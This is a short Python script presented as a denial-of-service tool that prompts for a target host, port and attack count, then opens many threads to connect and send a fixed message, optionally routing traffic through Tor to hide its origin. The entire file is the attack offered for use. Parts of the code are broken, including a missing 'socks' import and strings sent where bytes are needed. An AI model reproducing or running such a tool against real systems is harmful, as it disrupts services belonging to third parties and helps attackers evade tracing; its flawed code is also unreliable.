import socket
import pip._vendor.urllib3.contrib.socks
import threading
import time
from datetime import datetime
 
class DoS:
    def __init__(self, host, port, nThreads, UseTor):
        self.host = host
        self.port = port
        self.nThreads = nThreads
        self.UseTor = UseTor
        self.TPS = 0
        self.Delimiter = 2000
 
        if self.UseTor:
            socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9150)
 
        self.threads = []
 
        self.message = '-------= DoS Attack =-------'
 
    def SendAttack(self):
 
        if self.UseTor:
            s = socks.socksocket()
            
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
        try:
            s.connect((self.host, self.port))
            s.send(self.message) # TCP Attack
            s.sendto(self.message, (self.host, self.port)) # UDP Attack
            self.TPS -= 1
        except socket.error:
            pass
 
        s.close()
 
    def Attack(self):
 
        for i in range(self.nThreads):
            t = threading.Thread(target = self.SendAttack)
            self.threads.append(t)
 
        for i in self.threads:
            i.start()
 
            while self.TPS >= self.Delimiter:
                pass
 
            self.TPS += 1
 
        for i in self.threads:
            i.join()
 
Tor = input('[?] Did you want to use Tor (S/N): ').lower()
host = input('[*] Enter Target Host Address: ')
port = int(input('[*] Enter Target Port to Attack: '))
threads = int(input('[*] Enter number of Attacks: '))
 
UseTor = False
 
if Tor == 's':
    UseTor = True
 
hostip = socket.gethostbyname(host)
 
DoS = DoS(host, port, threads, UseTor)
 
print('\nHost %s ... IP %s' % (host, hostip))
print('\n\n[*] Starting The Attack At %s...' % (time.strftime("%H:%M:%S")))
start_time = datetime.now()
 
DoS.Attack()
 
end_time = datetime.now()
total_time = end_time - start_time
 
print('\n[*] The Attack Was Done At %s...' % (time.strftime("%H:%M:%S")))
print('[*] Total Attack Time %s...' % (total_time))